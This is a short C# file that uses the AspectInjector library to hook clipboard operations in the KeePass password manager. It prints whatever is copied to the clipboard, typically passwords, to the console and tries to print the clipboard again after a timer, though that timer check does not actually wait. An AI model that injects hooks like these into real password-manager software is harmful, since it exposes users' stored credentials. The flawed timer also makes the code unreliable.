using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using AspectInjector.Broker;

namespace KeePass.Util
{
    [Aspect(Scope.PerInstance)]
    [Injection(typeof(ClipboardHooks))]
    public class ClipboardHooks : Attribute
    {
        [Advice(Kind.After, Targets = Target.Method)]
        public void GetClipboardCopyContentHook(
                                [Argument(Source.ReturnValue)] object returnedVsalue,
                                [Argument(Source.Name)] string name,
                                [Argument(Source.Arguments)] object[] args)

        {
            Console.WriteLine(">> Contents copied to the clipboard: " + args[0]);
        }

        [Advice(Kind.After, Targets = Target.Method)]
        public void ClearingClipboardHook(
            [Argument(Source.Name)] string name)
        {
            System.Timers.Timer timer = new System.Timers.Timer(interval: 12000);
            timer.Start();

            if(timer.Interval == 12000)
            {
                if (System.Windows.Forms.Clipboard.ContainsText(TextDataFormat.Text))
                {
                    string clipboardText = Clipboard.GetText(TextDataFormat.Text);
                    Console.WriteLine(">> Current data in the clipboard: " + clipboardText);
                }
            }
           
        }
    }
}
